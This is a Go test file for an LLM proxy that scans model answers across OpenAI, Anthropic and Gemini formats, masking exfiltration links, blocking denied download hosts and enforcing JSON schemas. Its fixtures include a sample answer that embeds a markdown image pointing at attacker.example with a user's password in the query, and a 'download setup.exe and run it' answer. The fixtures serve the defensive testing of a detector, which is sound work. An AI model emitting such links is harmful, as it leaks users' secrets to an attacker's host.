package proxy

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/rs/zerolog"

	"github.com/yatuk/tamga/internal/config"
	"github.com/yatuk/tamga/internal/events"
	"github.com/yatuk/tamga/internal/policy"
	"github.com/yatuk/tamga/internal/scanner"
	"github.com/yatuk/tamga/internal/scanner/linkscan"
	"github.com/yatuk/tamga/internal/store"
)

// ── rig ──────────────────────────────────────────────────────────────────

// answerRig is a proxy wired as cmd/tamga wires it for answers: the request
// scanners, and an output-only registry with the code and link scanners,
// the latter reading its lists from the policy. Events are collected.
type answerRig struct {
	url string
	pol *policy.Policy

	mu     sync.Mutex
	events []events.Event
}

func answerOutputRegistry(getPolicy func() *policy.Policy) *scanner.Registry {
	out := scanner.NewRegistry()
	out.Register(scanner.NewCodeLeakScanner())
	out.Register(scanner.NewLinkScanner(func() *linkscan.Lists { return getPolicy().LinkLists() }))
	return out
}

func newAnswerRig(t *testing.T, policyYAML string, upstream http.Handler) *answerRig {
	t.Helper()
	up := httptest.NewServer(upstream)
	t.Cleanup(up.Close)
	u, _ := url.Parse(up.URL)
	g := &answerRig{pol: mustPolicy(t, policyYAML)}
	getPolicy := func() *policy.Policy { return g.pol }

	bus := events.NewBus()
	// As in cmd/tamga: findings are hashed when the event is published,
	// when the policy asks for it.
	bus.SetPrepare(store.EventFindingHasher(zerolog.Nop(), getPolicy))
	bus.Subscribe(func(e events.Event) {
		g.mu.Lock()
		g.events = append(g.events, e)
		g.mu.Unlock()
	})
	bus.Start()
	t.Cleanup(bus.Stop)

	srv := httptest.NewServer(NewHandler(HandlerConfig{
		Registry:           testRegistry(),
		OutputOnlyRegistry: answerOutputRegistry(getPolicy),
		GetPolicy:          getPolicy,
		UpstreamURLs:       map[string]*url.URL{"openai": u, "anthropic": u, "gemini": u},
		Config:             &config.Config{},
		Bus:                bus,
	}))
	t.Cleanup(srv.Close)
	g.url = srv.URL
	return g
}

func jsonUpstream(body string) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = io.Copy(io.Discard, r.Body)
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(body))
	})
}

func (g *answerRig) post(t *testing.T, path, body string) (*http.Response, string) {
	t.Helper()
	resp, err := http.Post(g.url+path, "application/json", strings.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = resp.Body.Close() })
	b, _ := io.ReadAll(resp.Body)
	return resp, string(b)
}

// outputEvent waits for the event of the answer scan.
func (g *answerRig) outputEvent(t *testing.T) events.Event {
	t.Helper()
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		g.mu.Lock()
		for _, e := range g.events {
			if e.EventType == "output_scanned" {
				g.mu.Unlock()
				return e
			}
		}
		g.mu.Unlock()
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatal("no output_scanned event was published")
	return events.Event{}
}

// ofType returns the findings of one type. The request scanners read the
// answer too, and a long address can look like a key to them.
func ofType(findings []scanner.Finding, typ string) []scanner.Finding {
	var out []scanner.Finding
	for _, f := range findings {
		if f.Type == typ {
			out = append(out, f)
		}
	}
	return out
}

func (g *answerRig) noOutputEvent(t *testing.T) {
	t.Helper()
	time.Sleep(150 * time.Millisecond)
	g.mu.Lock()
	defer g.mu.Unlock()
	for _, e := range g.events {
		if e.EventType == "output_scanned" {
			t.Fatalf("an output_scanned event was published: %+v", e.OutputFindings)
		}
	}
}

func openAIAnswer(text string) string {
	enc, _ := json.Marshal(text)
	return `{"id":"c1","choices":[{"index":0,"message":{"role":"assistant","content":` + string(enc) + `},"finish_reason":"stop"}],"usage":{"prompt_tokens":3,"completion_tokens":9}}`
}

func openAIText(t *testing.T, body string) string {
	t.Helper()
	var d struct {
		Choices []struct{ Message struct{ Content string } }
	}
	if err := json.Unmarshal([]byte(body), &d); err != nil || len(d.Choices) == 0 {
		t.Fatalf("not an OpenAI answer: %v\n%s", err, body)
	}
	return d.Choices[0].Message.Content
}

const chatRequest = `{"model":"gpt-4o","messages":[{"role":"user","content":"hello"}]}`
const chatRequestJSON = `{"model":"gpt-4o","response_format":{"type":"json_object"},"messages":[{"role":"user","content":"hello"}]}`

var linkMarker = regexp.MustCompile(`\[link_[a-z_]+_REDACTED\]`)

// ── links, buffered ──────────────────────────────────────────────────────

const linkPolicy = `
version: "1.0"
output_rules:
  enabled: true
  buffer_bytes: 262144
  redact_on: [malicious_link]
  block_on: [link_denied_host]
  streaming:
    enabled: true
  links:
    deny_hosts: [files.example.net]
    allow_hosts: [charts.example.com]
providers:
  allowed: [openai, anthropic, gemini]
`

const exfilAnswer = "Here is the summary you asked for. ![loading](https://attacker.example/p.png?q=the+user+said+their+password+is+hunter2+and+lives+in+Kadikoy) Let me know if you need more."
const exfilMasked = "Here is the summary you asked for. ![loading]([link_exfiltration_REDACTED]) Let me know if you need more."

func TestAnswerLinks_RedactedInEachProviderShape(t *testing.T) {
	enc, _ := json.Marshal(exfilAnswer)
	tests := []struct {
		name, path, response string
		read                 func(t *testing.T, body string) string
	}{
		{"OpenAI chat", "/v1/chat/completions", openAIAnswer(exfilAnswer), openAIText},
		{"Anthropic", "/anthropic/v1/messages",
			`{"id":"msg_1","type":"message","role":"assistant","content":[{"type":"text","text":` + string(enc) + `}],"stop_reason":"end_turn","usage":{"input_tokens":3,"output_tokens":9}}`,
			func(t *testing.T, body string) string {
				var d struct{ Content []struct{ Text string } }
				if err := json.Unmarshal([]byte(body), &d); err != nil {
					t.Fatalf("not JSON: %v\n%s", err, body)
				}
				return d.Content[0].Text
			}},
		{"Gemini", "/gemini/v1beta/models/gemini-2.5-flash:generateContent",
			`{"candidates":[{"content":{"role":"model","parts":[{"text":` + string(enc) + `}]},"finishReason":"STOP"}]}`,
			func(t *testing.T, body string) string {
				var d struct {
					Candidates []struct {
						Content struct{ Parts []struct{ Text string } }
					}
				}
				if err := json.Unmarshal([]byte(body), &d); err != nil {
					t.Fatalf("not JSON: %v\n%s", err, body)
				}
				return d.Candidates[0].Content.Parts[0].Text
			}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			g := newAnswerRig(t, linkPolicy, jsonUpstream(tt.response))
			resp, body := g.post(t, tt.path, `{"model":"m","messages":[{"role":"user","content":"hello"}],"contents":[]}`)
			if resp.StatusCode != http.StatusOK {
				t.Fatalf("status = %d: %s", resp.StatusCode, body)
			}
			if strings.Contains(body, "attacker.example") || strings.Contains(body, "hunter2") {
				t.Fatalf("the address reached the client: %s", body)
			}
			if got := tt.read(t, body); got != exfilMasked {
				t.Fatalf("\n got %q\nwant %q", got, exfilMasked)
			}
			if got := resp.Header.Get("X-Tamga-Output-Action"); got != "REDACT" {
				t.Errorf("X-Tamga-Output-Action = %q", got)
			}
			if got := resp.Header.Get("X-Tamga-Output-Redacted-Count"); got != "1" {
				t.Errorf("X-Tamga-Output-Redacted-Count = %q", got)
			}

			// Recorded as any masked answer is.
			e := g.outputEvent(t)
			links := ofType(e.OutputFindings, "malicious_link")
			if e.OutputAction != "REDACT" || len(links) != 1 {
				t.Fatalf("event: action %q, findings %+v", e.OutputAction, e.OutputFindings)
			}
			f := links[0]
			if f.Type != "malicious_link" || f.Category != "link_exfiltration" || f.Match != "attacker.example" || f.Role != "assistant" {
				t.Errorf("finding = %+v", f)
			}
			if raw, _ := json.Marshal(f); strings.Contains(string(raw), "hunter2") {
				t.Errorf("the finding holds the address: %s", raw)
			}
		})
	}
}

func TestAnswerLinks_DeniedHostBlocks(t *testing.T) {
	g := newAnswerRig(t, linkPolicy, jsonUpstream(openAIAnswer("Download it from https://cdn.files.example.net/setup.exe and run it.")))
	resp, body := g.post(t, "/v1/chat/completions", chatRequest)
	if resp.StatusCode != http.StatusForbidden || !strings.Contains(body, "output_policy_block") {
		t.Fatalf("status = %d: %s", resp.StatusCode, body)
	}
	if strings.Contains(body, "files.example.net") {
		t.Fatalf("the blocked answer reached the client: %s", body)
	}
	e := g.outputEvent(t)
	if e.OutputAction != "BLOCK" || len(e.OutputFindings) != 1 || e.OutputFindings[0].Category != "link_denied_host" {
		t.Fatalf("event: action %q, findings %+v", e.OutputAction, e.OutputFindings)
	}
}

func TestAnswerLinks_AllowedHostAndOrdinaryLinksAreLeftAlone(t *testing.T) {
	answer := "Here is the chart: ![sales](https://charts.example.com/render?c=%7Btype%3A%27bar%27%7D+with+a+long+tail+of+words+in+its+address+here) " +
		"and the docs are at [pkg.go.dev](https://pkg.go.dev/net/http#Client). " +
		"Search: https://www.google.com/search?q=golang+http+client+timeout+best+practices&hl=tr"
	g := newAnswerRig(t, linkPolicy, jsonUpstream(openAIAnswer(answer)))
	resp, body := g.post(t, "/v1/chat/completions", chatRequest)
	if resp.StatusCode != http.StatusOK || openAIText(t, body) != answer {
		t.Fatalf("status = %d, body changed: %s", resp.StatusCode, body)
	}
	if got := resp.Header.Get("X-Tamga-Output-Action"); got == "REDACT" || got == "BLOCK" {
		t.Fatalf("X-Tamga-Output-Action = %q for an ordinary answer", got)
	}
	links, _, _ := bufferedLinkScan(t, g.pol, answer)
	if len(links) != 0 {
		t.Fatalf("link findings for an ordinary answer: %+v", links)
	}
}

// ── links, the two sets, buffered and streamed ───────────────────────────

func loadLinkCorpus(t *testing.T) (benign []string, malicious []struct{ Name, Text, Category string }) {
	t.Helper()
	dir := filepath.Join("..", "scanner", "linkscan", "testdata")
	for name, into := range map[string]interface{}{"benign_answers.json": &benign, "malicious_answers.json": &malicious} {
		raw, err := os.ReadFile(filepath.Join(dir, name))
		if err != nil {
			t.Fatal(err)
		}
		if err := json.Unmarshal(raw, into); err != nil {
			t.Fatalf("%s: %v", name, err)
		}
	}
	return benign, malicious
}

// linkGuard is a stream guard that masks every link finding, with the
// scanners an answer is scanned with.
func linkGuard(pol *policy.Policy) *streamGuard {
	reg := testRegistry()
	out := answerOutputRegistry(func() *policy.Policy { return pol })
	g := newStreamGuard()
	g.scan = func(text []byte) ([]scanner.Finding, error) {
		return scanStreamText(context.Background(), reg, out, text, scanner.PipelineConfig{})
	}
	g.blocks = func(f scanner.Finding) bool { return pol.EvaluateOutput([]scanner.Finding{f}) == policy.ActionBlock }
	g.redacts = pol.OutputRedacts
	return g
}

func streamOf(text string, size int) [][]byte {
	var evs [][]byte
	for _, p := range pieces(text, size) {
		evs = append(evs, openAIChunk(p))
	}
	return append(evs, openAIFinish, openAIDone)
}

// bufferedLinkScan scans an answer as a buffered response is scanned and
// returns the link findings and the text the client would get.
func bufferedLinkScan(t *testing.T, pol *policy.Policy, text string) ([]scanner.Finding, string, policy.Action) {
	t.Helper()
	raw := []byte(openAIAnswer(text))
	res, err := scanResponseBody(context.Background(), testRegistry(), answerOutputRegistry(func() *policy.Policy { return pol }),
		pol, ProviderFor("openai"), raw, 0, scanner.PipelineConfig{})
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	var links []scanner.Finding
	for _, f := range res.findings {
		if f.Type == scanner.LinkFindingType {
			links = append(links, f)
		}
	}
	out := text
	if res.action == policy.ActionRedact {
		out = openAIText(t, string(res.redacted))
	}
	return links, out, res.action
}

const linkOnlyPolicy = `
version: "1.0"
output_rules:
  enabled: true
  redact_on: [malicious_link]
  streaming:
    enabled: true
providers:
  allowed: [openai]
`

// The measurement of false positives, on the path an answer takes: no
// answer of the benign set is changed, buffered or streamed.
func TestAnswerLinks_BenignSetIsUntouchedBufferedAndStreamed(t *testing.T) {
	pol := mustPolicy(t, linkOnlyPolicy)
	benign, _ := loadLinkCorpus(t)
	if len(benign) < 40 {
		t.Fatalf("%d benign answers, at least 40 are wanted", len(benign))
	}
	buffered, streamed, streams := 0, 0, 0
	for i, text := range benign {
		links, out, _ := bufferedLinkScan(t, pol, text)
		if len(links) > 0 || out != text {
			buffered++
			t.Errorf("benign answer %d, buffered: %d link findings (%v)", i, len(links), links)
		}
		for _, size := range []int{1, 7, 40, 200} {
			streams++
			_, got, stopped := run(t, linkGuard(pol), streamOf(text, size)...)
			if stopped || got != text {
				streamed++
				t.Errorf("benign answer %d, streamed in pieces of %d: stopped=%v\n got %q\nwant %q", i, size, stopped, got, text)
			}
		}
	}
	t.Logf("%d benign answers: %d changed when buffered; %d of %d streams changed", len(benign), buffered, streamed, streams)
}

// Every answer of the malicious set has its link taken out, and a streamed
// answer comes out as the buffered one does however it is cut: nothing of
// the address is sent before the link is judged.
func TestAnswerLinks_MaliciousSetIsMaskedBufferedAndStreamed(t *testing.T) {
	pol := mustPolicy(t, linkOnlyPolicy)
	_, malicious := loadLinkCorpus(t)
	for _, m := range malicious {
		links, masked, action := bufferedLinkScan(t, pol, m.Text)
		found := false
		for _, f := range links {
			if f.Category == m.Category {
				found = true
			}
		}
		if !found || action != policy.ActionRedact {
			t.Errorf("%s, buffered: action %s, findings %v, want %s", m.Name, action, links, m.Category)
			continue
		}
		want := linkMarker.ReplaceAllString(masked, "[LINK]")
		if !strings.Contains(want, "[LINK]") {
			t.Errorf("%s, buffered: nothing was masked: %q", m.Name, masked)
			continue
		}
		for _, size := range []int{1, 3, 8, 21, 64, 300} {
			_, got, stopped := run(t, linkGuard(pol), streamOf(m.Text, size)...)
			if stopped {
				t.Errorf("%s, pieces of %d: the stream was stopped", m.Name, size)
				continue
			}
			if got := linkMarker.ReplaceAllString(got, "[LINK]"); got != want {
				t.Errorf("%s, pieces of %d:\n got %q\nwant %q", m.Name, size, got, want)
			}
		}
	}
}

func TestAnswerLinks_StreamE2E(t *testing.T) {
	t.Run("masked", func(t *testing.T) {
		up := &streamUpstream{pieceSize: 6, reply: func(string) string { return exfilAnswer }}
		g := newAnswerRig(t, linkPolicy, up)
		wire, text, _, resp := readStream(t, g.url, streamRequest)
		if resp.StatusCode != http.StatusOK || text != exfilMasked {
			t.Fatalf("status %d\n got %q\nwant %q", resp.StatusCode, text, exfilMasked)
		}
		if strings.Contains(wire, "attacker") || strings.Contains(wire, "hunter2") {
			t.Fatalf("part of the address is on the wire:\n%s", wire)
		}
		if !strings.HasSuffix(strings.TrimSpace(wire), "data: [DONE]") {
			t.Fatalf("the stream did not end normally:\n%s", wire)
		}
		e := g.outputEvent(t)
		if links := ofType(e.OutputFindings, "malicious_link"); e.OutputAction != "REDACT" || len(links) != 1 || links[0].Category != "link_exfiltration" {
			t.Fatalf("event: action %q, findings %+v", e.OutputAction, e.OutputFindings)
		}
	})
	t.Run("blocked", func(t *testing.T) {
		up := &streamUpstream{pieceSize: 5, reply: func(string) string {
			return "The installer is at https://cdn.files.example.net/setup.exe and it only takes a minute to run it on your machine."
		}}
		g := newAnswerRig(t, linkPolicy, up)
		wire, text, _, _ := readStream(t, g.url, streamRequest)
		if strings.Contains(text, "files.example") || strings.Contains(text, "https://") {
			t.Fatalf("part of the address was sent: %q", text)
		}
		if !strings.Contains(wire, "content_blocked_by_policy") || strings.Contains(wire, "[DONE]") {
			t.Fatalf("the stream was not ended:\n%s", wire)
		}
		e := g.outputEvent(t)
		if e.OutputAction != "BLOCK" || e.OutputFindings[0].Category != "link_denied_host" {
			t.Fatalf("event: action %q, findings %+v", e.OutputAction, e.OutputFindings)
		}
	})
}

// ── schema, buffered ─────────────────────────────────────────────────────

func schemaPolicy(when, blockOn string) string {
	return `
version: "1.0"
output_rules:
  enabled: true
  buffer_bytes: 65536
  block_on: [` + blockOn + `]
  streaming:
    enabled: true
  json_schema:
    when: ` + when + `
    schema:
      type: object
      required: [answer, confidence]
      additionalProperties: false
      properties:
        answer: {type: string, minLength: 1}
        confidence: {type: number, minimum: 0, maximum: 1}
providers:
  allowed: [openai, anthropic, gemini]
`
}

const (
	goodDoc  = `{"answer": "Ankara", "confidence": 0.93}`
	badDoc   = `{"answer": "Ankara", "confidence": 7}`
	proseDoc = "Sure! The capital of Türkiye is Ankara."
)

func TestAnswerSchema_BufferedBlocksAMismatch(t *testing.T) {
	tests := []struct {
		name, doc string
		status    int
		category  string
		keyword   string
	}{
		{"accepted", goodDoc, http.StatusOK, "", ""},
		{"a value out of range", badDoc, http.StatusForbidden, "schema_mismatch", "maximum"},
		{"prose", proseDoc, http.StatusForbidden, "not_json", ""},
		{"fenced", "```json\n" + goodDoc + "\n```", http.StatusForbidden, "not_json", ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			g := newAnswerRig(t, schemaPolicy("always", "output_schema"), jsonUpstream(openAIAnswer(tt.doc)))
			resp, body := g.post(t, "/v1/chat/completions", chatRequest)
			if resp.StatusCode != tt.status {
				t.Fatalf("status = %d, want %d: %s", resp.StatusCode, tt.status, body)
			}
			if tt.status == http.StatusOK {
				if openAIText(t, body) != tt.doc {
					t.Fatalf("an accepted answer was changed: %s", body)
				}
				return
			}
			if strings.Contains(body, "Ankara") {
				t.Fatalf("the withheld answer reached the client: %s", body)
			}
			e := g.outputEvent(t)
			if e.OutputAction != "BLOCK" || len(e.OutputFindings) == 0 {
				t.Fatalf("event: action %q, findings %+v", e.OutputAction, e.OutputFindings)
			}
			var f scanner.Finding
			for _, of := range e.OutputFindings {
				if of.Type == "output_schema" {
					f = of
				}
			}
			if f.Category != tt.category || f.Metadata["keyword"] != tt.keyword || f.Path != "choices[0].message.content" {
				t.Fatalf("finding = %+v", f)
			}
			if tt.keyword != "" && f.Metadata["schema_path"] != "/properties/confidence/maximum" {
				t.Fatalf("schema_path = %q", f.Metadata["schema_path"])
			}
		})
	}
}

// Left out of block_on, a mismatch is recorded and the answer goes through.
func TestAnswerSchema_BufferedMismatchNotInBlockOnIsRecordedAndPasses(t *testing.T) {
	g := newAnswerRig(t, schemaPolicy("always", "tc_kimlik"), jsonUpstream(openAIAnswer(badDoc)))
	resp, body := g.post(t, "/v1/chat/completions", chatRequest)
	if resp.StatusCode != http.StatusOK || openAIText(t, body) != badDoc {
		t.Fatalf("status = %d: %s", resp.StatusCode, body)
	}
	if got := resp.Header.Get("X-Tamga-Output-Action"); got != "PASS" {
		t.Errorf("X-Tamga-Output-Action = %q", got)
	}
	if got := resp.Header.Get("X-Tamga-Output-Findings"); got != "1" {
		t.Errorf("X-Tamga-Output-Findings = %q", got)
	}
	e := g.outputEvent(t)
	if e.OutputAction != "PASS" || len(e.OutputFindings) != 1 || e.OutputFindings[0].Type != "output_schema" {
		t.Fatalf("event: action %q, findings %+v", e.OutputAction, e.OutputFindings)
	}
}

// when: requested holds an answer to the schema only when the request asked
// for JSON, in whichever way its provider has for it.
func TestAnswerSchema_OnlyWhenTheRequestAskedForJSON(t *testing.T) {
	enc, _ := json.Marshal(proseDoc)
	anthropicAnswer := `{"id":"msg_1","type":"message","role":"assistant","content":[{"type":"text","text":` + string(enc) + `}],"stop_reason":"end_turn"}`
	geminiAnswer := `{"candidates":[{"content":{"role":"model","parts":[{"text":` + string(enc) + `}]},"finishReason":"STOP"}]}`
	tests := []struct {
		name, path, request, answer string
		status                      int
	}{
		{"openai, not asked", "/v1/chat/completions", chatRequest, openAIAnswer(proseDoc), 200},
		{"openai, json_object", "/v1/chat/completions", chatRequestJSON, openAIAnswer(proseDoc), 403},
		{"openai, json_schema", "/v1/chat/completions", `{"model":"gpt-4o","response_format":{"type":"json_schema","json_schema":{"name":"a","schema":{}}},"messages":[{"role":"user","content":"hello"}]}`, openAIAnswer(proseDoc), 403},
		{"openai, text asked for by name", "/v1/chat/completions", `{"model":"gpt-4o","response_format":{"type":"text"},"messages":[{"role":"user","content":"hello"}]}`, openAIAnswer(proseDoc), 200},
		{"anthropic, not asked", "/anthropic/v1/messages", `{"model":"claude-sonnet-4-5","max_tokens":64,"messages":[{"role":"user","content":"hello"}]}`, anthropicAnswer, 200},
		{"anthropic, output_config", "/anthropic/v1/messages", `{"model":"claude-sonnet-4-5","max_tokens":64,"output_config":{"format":{"type":"json_schema","schema":{}}},"messages":[{"role":"user","content":"hello"}]}`, anthropicAnswer, 403},
		{"gemini, not asked", "/gemini/v1beta/models/gemini-2.5-flash:generateContent", `{"contents":[{"role":"user","parts":[{"text":"hello"}]}]}`, geminiAnswer, 200},
		{"gemini, responseMimeType", "/gemini/v1beta/models/gemini-2.5-flash:generateContent", `{"contents":[{"role":"user","parts":[{"text":"hello"}]}],"generationConfig":{"responseMimeType":"application/json"}}`, geminiAnswer, 403},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			g := newAnswerRig(t, schemaPolicy("requested", "output_schema"), jsonUpstream(tt.answer))
			resp, body := g.post(t, tt.path, tt.request)
			if resp.StatusCode != tt.status {
				t.Fatalf("status = %d, want %d: %s", resp.StatusCode, tt.status, body)
			}
		})
	}
}

// A tool call's arguments answer to the tool's schema, not to this one, and
// a refusal is not a document.
func TestAnswerSchema_WhatIsNotJudged(t *testing.T) {
	answers := map[string]string{
		"tool call only":        `{"id":"c1","choices":[{"index":0,"message":{"role":"assistant","content":null,"tool_calls":[{"id":"call_1","type":"function","function":{"name":"lookup","arguments":"{\"city\":\"Ankara\",\"confidence\":7}"}}]},"finish_reason":"tool_calls"}]}`,
		"refusal":               `{"id":"c1","choices":[{"index":0,"message":{"role":"assistant","content":null,"refusal":"I can't help with that."},"finish_reason":"stop"}]}`,
		"anthropic tool use":    `{"id":"msg_1","type":"message","role":"assistant","content":[{"type":"tool_use","id":"tu_1","name":"lookup","input":{"confidence":7}}],"stop_reason":"tool_use"}`,
		"gemini function call":  `{"candidates":[{"content":{"role":"model","parts":[{"functionCall":{"name":"lookup","args":{"confidence":7}}}]},"finishReason":"STOP"}]}`,
		"an error the provider": `{"error":{"message":"overloaded","type":"server_error"}}`,
	}
	schema, _ := mustPolicy(t, schemaPolicy("always", "output_schema")).AnswerSchema()
	for name, raw := range answers {
		found, err := schemaFindings(context.Background(), schema, []byte(raw))
		if err != nil || len(found) != 0 {
			t.Errorf("%s: findings %+v, err %v", name, found, err)
		}
	}
	// The message next to a tool call is judged.
	withText := `{"id":"c1","choices":[{"index":0,"message":{"role":"assistant","content":"Let me look that up.","tool_calls":[{"id":"call_1","type":"function","function":{"name":"lookup","arguments":"{}"}}]},"finish_reason":"tool_calls"}]}`
	if found, _ := schemaFindings(context.Background(), schema, []byte(withText)); len(found) != 1 || found[0].Category != "not_json" {
		t.Errorf("a message beside a tool call: %+v", found)
	}
	// Each choice is its own document.
	two := `{"choices":[{"index":0,"message":{"content":` + mustQuote(goodDoc) + `}},{"index":1,"message":{"content":` + mustQuote(badDoc) + `}}]}`
	found, _ := schemaFindings(context.Background(), schema, []byte(two))
	if len(found) != 1 || found[0].Path != "choices[1].message.content" {
		t.Errorf("two choices: %+v", found)
	}
}

func mustQuote(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

// Where no request stands behind the answer (the LiteLLM bridge), the
// schema applies when the policy applies it to every answer and not
// otherwise.
func TestAnswerSchema_WithoutARequest(t *testing.T) {
	for when, want := range map[string]int{"always": 1, "requested": 0} {
		pol := mustPolicy(t, schemaPolicy(when, "output_schema"))
		res, err := scanResponseBody(context.Background(), testRegistry(), nil, pol, ProviderFor("openai"),
			[]byte(openAIAnswer(badDoc)), 0, scanner.PipelineConfig{})
		if err != nil {
			t.Fatal(err)
		}
		if len(res.findings) != want {
			t.Errorf("when: %s: %d findings, want %d", when, len(res.findings), want)
		}
		if want == 1 && res.action != policy.ActionBlock {
			t.Errorf("when: %s: action %s", when, res.action)
		}
	}
}

func TestLiteLLM_AnswerLinksAndSchema(t *testing.T) {
	t.Run("link masked", func(t *testing.T) {
		g := newScanRig(t, scanRigOptions{policy: `
version: "1.0"
rules:
  pii:
    action: BLOCK
    types: [tc_kimlik]
output_rules:
  enabled: true
  redact_on: [malicious_link]
`, scanners: []scanner.Scanner{scanner.NewLinkScanner(nil)}})
		out, _, raw := g.litellm(t, "response", []string{exfilAnswer}, nil)
		if out.Action != "GUARDRAIL_INTERVENED" || len(out.Texts) != 1 || out.Texts[0] != exfilMasked {
			t.Fatalf("action %q, texts %q: %s", out.Action, out.Texts, raw)
		}
	})
	t.Run("schema, every answer", func(t *testing.T) {
		g := newScanRig(t, scanRigOptions{policy: schemaPolicy("always", "output_schema")})
		out, _, raw := g.litellm(t, "response", []string{badDoc}, nil)
		if out.Action != "BLOCKED" || !strings.Contains(out.BlockedReason, "output_schema/schema_mismatch") {
			t.Fatalf("action %q, reason %q: %s", out.Action, out.BlockedReason, raw)
		}
		ok, _, raw := g.litellm(t, "response", []string{goodDoc}, nil)
		if ok.Action != "NONE" {
			t.Fatalf("an accepted answer: action %q: %s", ok.Action, raw)
		}
	})
	t.Run("schema, when requested", func(t *testing.T) {
		g := newScanRig(t, scanRigOptions{policy: schemaPolicy("requested", "output_schema")})
		out, _, raw := g.litellm(t, "response", []string{badDoc}, nil)
		if out.Action != "NONE" {
			t.Fatalf("action %q: %s", out.Action, raw)
		}
	})
}

// ── schema, streamed ─────────────────────────────────────────────────────

// contentDeltas returns the text of each content delta of an event stream,
// in order.
func contentDeltas(wire string) []string {
	var out []string
	for _, block := range strings.Split(wire, "\n\n") {
		_, data, _, ok := splitEvent([]byte(block + "\n\n"))
		if !ok {
			continue
		}
		var chunk struct {
			Choices []struct {
				Delta struct {
					Content *string `json:"content"`
				} `json:"delta"`
			} `json:"choices"`
		}
		if json.Unmarshal(data, &chunk) != nil {
			continue
		}
		for _, c := range chunk.Choices {
			if c.Delta.Content != nil {
				out = append(out, *c.Delta.Content)
			}
		}
	}
	return out
}

const streamRequestJSON = `{"model":"gpt-4o","stream":true,"response_format":{"type":"json_object"},"messages":[{"role":"user","content":"Capital of Türkiye?"}]}`

// When a mismatch withholds the answer, a streamed answer is kept back
// until it is whole: the client gets the events as they come, with no text
// in them, and then all of the text or none of it.
func TestAnswerSchema_StreamHeldUntilJudged(t *testing.T) {
	long := `{"answer": "` + strings.Repeat("Ankara is the capital. ", 40) + `", "confidence": 0.5}`
	t.Run("accepted", func(t *testing.T) {
		up := &streamUpstream{pieceSize: 9, reply: func(string) string { return long }}
		g := newAnswerRig(t, schemaPolicy("requested", "output_schema"), up)
		wire, text, _, resp := readStream(t, g.url, streamRequestJSON)
		if resp.StatusCode != http.StatusOK || text != long {
			t.Fatalf("status %d\n got %q\nwant %q", resp.StatusCode, text, long)
		}
		deltas := contentDeltas(wire)
		if len(deltas) < 50 {
			t.Fatalf("only %d content events reached the client: the stream was collected, not passed on", len(deltas))
		}
		withText := 0
		for _, d := range deltas {
			if d != "" {
				withText++
			}
		}
		if withText != 1 || deltas[len(deltas)-1] != long {
			t.Fatalf("%d events carried text, want the last one only", withText)
		}
		if !strings.HasSuffix(strings.TrimSpace(wire), "data: [DONE]") {
			t.Fatalf("the stream did not end normally")
		}
		g.noOutputEvent(t)
	})
	t.Run("mismatch", func(t *testing.T) {
		bad := strings.Replace(long, "0.5", "50", 1)
		up := &streamUpstream{pieceSize: 9, reply: func(string) string { return bad }}
		g := newAnswerRig(t, schemaPolicy("requested", "output_schema"), up)
		wire, text, _, _ := readStream(t, g.url, streamRequestJSON)
		if text != "" || strings.Contains(wire, "Ankara") {
			t.Fatalf("text of a withheld answer was sent: %q", text)
		}
		if !strings.Contains(wire, `"reason":"schema_mismatch"`) || strings.Contains(wire, "[DONE]") {
			t.Fatalf("the stream was not ended with the reason:\n%s", wire[len(wire)-300:])
		}
		e := g.outputEvent(t)
		if e.OutputAction != "BLOCK" || len(e.OutputFindings) != 1 || e.OutputFindings[0].Metadata["keyword"] != "maximum" {
			t.Fatalf("event: action %q, findings %+v", e.OutputAction, e.OutputFindings)
		}
	})
	t.Run("not asked for JSON, not held", func(t *testing.T) {
		up := &streamUpstream{pieceSize: 9, reply: func(string) string {
			return strings.Repeat("Ankara is the capital, and it has been since 1923. ", 8)
		}}
		g := newAnswerRig(t, schemaPolicy("requested", "output_schema"), up)
		wire, _, _, _ := readStream(t, g.url, streamRequest)
		withText := 0
		for _, d := range contentDeltas(wire) {
			if d != "" {
				withText++
			}
		}
		if withText < 5 || !strings.Contains(wire, "[DONE]") {
			t.Fatalf("%d events carried text: an answer the schema does not apply to was held", withText)
		}
	})
}

// A stream the guard ends without a finding (here: too long to be held to
// its schema) was recorded as a scanned answer that passed. It is recorded
// as withheld.
func TestAnswerSchema_StreamEndedWithoutAFindingIsRecordedAsBlocked(t *testing.T) {
	long := `{"answer": "` + strings.Repeat("Ankara is the capital. ", 4000) + `", "confidence": 0.5}`
	up := &streamUpstream{pieceSize: 4096, reply: func(string) string { return long }}
	g := newAnswerRig(t, schemaPolicy("always", "output_schema"), up) // buffer_bytes: 65536
	wire, text, _, _ := readStream(t, g.url, streamRequest)
	if text != "" || !strings.Contains(wire, `"reason":"schema_unjudged_too_large"`) {
		t.Fatalf("%d bytes of text were sent; the end of the stream: %s", len(text), wire[max(0, len(wire)-200):])
	}
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		g.mu.Lock()
		for _, e := range g.events {
			if e.EventType != "output_scanned" && e.OutputAction != "" {
				g.mu.Unlock()
				if e.OutputAction != "BLOCK" {
					t.Fatalf("the request's event has output action %q, want BLOCK", e.OutputAction)
				}
				return
			}
		}
		g.mu.Unlock()
		time.Sleep(10 * time.Millisecond)
	}
	g.mu.Lock()
	defer g.mu.Unlock()
	t.Fatalf("no event of the request carries an output action: %d events", len(g.events))
}

// When a mismatch is only recorded, the text streams as it always does and
// is judged at the end: the client has all of it by then.
func TestAnswerSchema_StreamRecordedWhenNotInBlockOn(t *testing.T) {
	bad := `{"answer": "` + strings.Repeat("Ankara is the capital. ", 40) + `", "confidence": 50}`
	up := &streamUpstream{pieceSize: 9, reply: func(string) string { return bad }}
	g := newAnswerRig(t, schemaPolicy("always", "tc_kimlik"), up)
